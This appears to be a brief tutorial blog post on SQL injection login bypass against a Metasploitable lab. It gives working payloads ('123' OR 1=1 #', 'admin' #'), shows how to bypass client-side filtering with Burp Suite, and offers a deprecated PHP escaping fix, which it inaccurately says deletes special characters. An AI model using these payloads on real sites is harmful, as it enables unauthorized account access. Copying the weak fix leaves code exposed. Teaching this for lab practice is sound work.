+++
categories = ["Metasploitable", "SQL"]
date = "2021-02-15"
title = "SQL Post Injection"
type = ["posts","post"]
[ author ]
  name = "nazori"
+++

SQL injection is a code injection technique that might destroy your database. It is one of the most common web hacking techniques. Consists in the placement of malicious code in SQL statements, via web page input.

## No Filtering

If there is not filtering at all the typical request that it is made to the server would be something like:

```
SELECT * FROM accounts WHERE username='$USER_INPUT' AND password='$PASS_INPUT'
```

Where the $ values are filled up with whatever we write on the input fields. So we can try to log into the admin account by changing the request.

#### Password Trick

*User*: `admin`

*Password*: `123' OR 1=1 #`

```
SELECT * FROM accounts WHERE username='admin' AND password='123' OR 1=1 #'
```

The `#` comments the rest of the line. This way the interpreter will ignore the other `'` that the programmer added to end the password. If we had to write this into a URL we would have to use `%23`. It is the equivalent to `#` in HTML.

#### User Trick

*User*: `admin' #`

*Password*: ` `

```
SELECT * FROM accounts WHERE username='admin' #' AND password=' '
```

## Client Filtering

We can assume that we are on this case if when submitting info the page displays errors without reloading. Also we can check it out by using Burp Suite and setting the interceptor on. We won't get any packages.

To avoid this we just have to send a regular request (without any special character). We set the interceptor mode and then we can change de request in Burp Suite as we have described in the precious method.

## Avoid Injection

To avoid injection we can use as a temporaly solution the `real_escape_string()`. This method will delete any special character such as ` \x00, \n, \r, \, ', " and \x1a`.

```
<?php
// Connect
$link = mysql_connect('mysql_host', 'mysql_user', 'mysql_password')
    OR die(mysql_error());

// Query
$query = sprintf("SELECT * FROM users WHERE user='%s' AND password='%s'",
            mysql_real_escape_string($user),
            mysql_real_escape_string($password));
?>
```
